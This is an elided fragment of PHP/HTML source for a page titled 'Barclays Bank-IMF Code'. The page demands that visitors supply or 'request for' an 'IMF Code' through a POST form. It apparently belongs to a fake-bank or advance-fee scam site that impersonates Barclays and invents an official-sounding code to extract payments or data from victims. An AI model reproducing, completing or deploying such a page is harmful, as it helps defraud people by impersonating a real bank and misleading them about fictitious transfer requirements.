...
?>
<html>
<title>Barclays Bank-IMF Code</title>
<html>
            ...
            <div class="col-md-12 justify-content-right">
                <div id="Sign In" align="center">
                    <div style="width:600px;border:3px solid #ebebe0; background-color:white;margin:auto;padding:5px;border-radius:20px;">
                        ...
                        <p class="glow"><span style="font-family: 'Nobile', sans-serif;font-size:35px;">IMF Code Is Required!!:</span></p>

                        <span style="font-family: 'Smooch Sans', sans-serif; font-size:25px">You are required to request for IMF Code </span><br>
                        <form action="" method="POST">
                            <?=@$error_msg?>
                            <p style="color:#66a3ff"><span style="font-family: 'Smooch Sans', sans-serif;font-size:35px;">Login
                            IMF Code  :</span></p>
                            <span style="font-family: 'Smooch Sans', sans-serif;font-size:25px;"> IMF Code  : </span><input
                                type="text" name="imf_code" id="pass" /><br><br>
